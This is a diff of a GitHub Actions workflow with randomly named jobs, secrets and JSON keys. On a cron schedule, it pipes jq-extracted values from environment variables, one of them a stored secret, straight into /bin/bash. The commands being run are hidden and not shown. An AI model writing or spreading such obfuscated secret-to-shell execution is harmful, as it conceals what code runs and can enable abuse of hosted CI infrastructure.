@@ -3,28 +3,20 @@ name: wuhaoning3214
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 3/6 * * *'
+    - cron: '19 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wuhaoning3214
         env:
-          kkqh88: ${{ secrets.kkqh88 }}
+          etnsm08: ${{ secrets.etnsm08 }}
         run: |
-          echo $kkqh88 | jq -r .oavvm58782 | /bin/bash
-          echo $eue82647 | jq -r .n3 | /bin/bash
-          echo $dmzm2 | jq -r .nlg07 | /bin/bash
-          echo $dylbw3595 | jq -r .ohd9543 | /bin/bash
-          echo $rkers3903 | jq -r .bg824 | /bin/bash
-          echo $yz9947 | jq -r .c87424 | /bin/bash
-          echo $szj23 | jq -r .sym5132 | /bin/bash
-          echo $j883 | jq -r .ir51 | /bin/bash
-          echo $ndlf94640 | jq -r .oagr6 | /bin/bash
-          echo $kpq739 | jq -r .u5189 | /bin/bash
-          echo $i57 | jq -r .owzo69 | /bin/bash
-          echo $mybv3 | jq -r .hlzob6348 | /bin/bash
-          echo $jyhs179 | jq -r .j30487 | /bin/bash
-          echo $dwl73 | jq -r .e5 | /bin/bash
+          echo $etnsm08 | jq -r .q5471 | /bin/bash
+          echo $t2054 | jq -r .reu0 | /bin/bash
+          echo $yen1 | jq -r .z98 | /bin/bash
+          echo $cbbk85672 | jq -r .g1 | /bin/bash
+          echo $gxy11 | jq -r .xd064 | /bin/bash
 
